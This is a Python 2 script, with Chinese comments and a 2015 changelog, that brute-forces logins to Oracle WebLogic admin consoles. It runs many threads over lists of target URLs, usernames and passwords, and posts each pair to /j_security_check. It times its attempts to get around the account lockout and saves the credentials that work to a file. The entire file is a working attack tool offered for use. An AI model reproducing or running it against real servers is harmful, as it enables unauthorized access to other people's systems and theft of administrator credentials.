#coding=utf-8
import Queue
import requests
import time
import threading
import sys
import os
'''
Version 5
Copyright dc3
http://185.es
Finish at 2015-09-26 18:31
修复了以前无法控制线程数量的错误
添加在cmd窗口上显示线程数(Linux系统的就自己修改下命令吧)
Usage:python main.py 200
设定的是200个线程，但实际只有199个为破解线程，还有一个主线程
使用前请安装requests模块
遇到任何问题或者bug请到我博客留言
Fix Log:
2015-9-28 00:43 修复线程判断出错问题
2015-9-28 20:15 修复卡死问题
2015-10-2 22:30 线程及URL的变化只会在启动线程时变化,将os.system移至添加线程处
2015-10-2 23:45 添加显示成功数和失败数
'''
def post(i):
	global xtime
	global success
	global fail
	try:
		z=0
		co=0
		pwdcount=len(open('pwd.txt','rU').readlines())
		usrcount=len(open('usr.txt','rU').readlines())
		sum=pwdcount*usrcount #总尝试次数=用户名个数*密码个数
		for usr in open("usr.txt").readlines():
			usr=usr.strip('\n')
			for pwd in open("pwd.txt").readlines():
				pwd=pwd.strip('\n')
				#print 'weblogic'+'/'+pwd
				z=z+1
				co=co+1
				if z == 6:	#账户错误达到5次，此账户锁定30分钟，等待重试
					print i+' Waiting......'
					ct=0
					b=31
					while (ct<b):
						ncount=b-ct
						ncount='%d' %ncount
						print i+'\n'+ncount+'min left'
						time.sleep(60)
						ct+=1
					z=1 #重置计数
				#print i+'/'+usr+'/'+pwd
				data = {'j_username':usr,'j_password':pwd}
				s = requests.post(i+'/j_security_check',data =data,timeout=5)
				if s.content.count('Home Page') !=0 or s.content.count('WebLogic Server Console') !=0 or s.content.count('console.portal') !=0:
					print i,'Success!!!!!' 
					success+=1
					print usr+'/'+pwd
					f=open(xtime+'.txt', 'a')
					f.write(i+' ')
					f.write(usr+'/')
					f.write(pwd+'\n')
					f.close()
					s=0
					return #成功，停止循环
				elif co == sum: #达到总尝试次数，则输出失败
						print i,'Failed!'
						fail+=1
						f = open("bad.txt", 'a')
						f.write(i+'\n')
						f.close()
						s = 0
						return #失败，停止循环
	except:
		s=0


def main():
	global xtime
	global success
	global fail
	success=0
	fail=0
	xtime=time.strftime("%Y-%m-%d[%H.%M.%S]")
	print xtime
	MaxThreads=sys.argv[1]
	MaxThreads=int(MaxThreads)
	mythreads = Queue.Queue(maxsize = 0) 
	for i in open("u.txt").readlines():#先将所有线程装入队列，等待取出
		i=i.strip('\n')
		t=threading.Thread(target=post, args=(i,))
		t.setDaemon(True)
		mythreads.put(t)
	print 'Total Threads:%d' %MaxThreads
	print 'Total URLs:%d' %mythreads.qsize()
	time.sleep(2)
	while True:#若条件都不满足，则死循环
		if(threading.active_count() == 1 and mythreads.qsize() == 0): #若剩余URL数等于0,活动线程为1，则退出.主线程占一个 #2015-9-28 00:43 Fixed
			print 'Done at %s' %time.strftime("%Y-%m-%d[%H.%M.%S]")
			break
		elif(threading.active_count() < MaxThreads): #判断正在运行的线程数量,如果小于输入值则继续添加线程
			if (mythreads.qsize() ==0 ): #如果剩余URL为0，则不从列队中读取(否则一直处于卡死状态)，并改变窗口标题提示用户 #2015-9-28 20:15 Fixed
				os.system("title No URL left,waiting to exit,Current threads: %d" %threading.active_count())
				time.sleep(60) #60秒之后回到上一个if判断线程是否全部结束
			else:
				os.system("title Current threads: %d,URLs left: %d,Success:%d,Failed:%d" %(threading.active_count(),mythreads.qsize(),success,fail)) #更改窗口标题，如觉得太消耗CPU资源可以注释掉 #线程及URL的变化只会在启动线程时变化 2015-10-2 22:30 Fixed
				t=mythreads.get() #取出一个线程
				t.start() #加载该线程
				t.join(1) #阻塞一秒钟，然后加载下个线程，不愿意等可以注释掉
	print 'Success:%d,Failed:%d' %(success,fail)
	

if __name__ == '__main__':
	main()
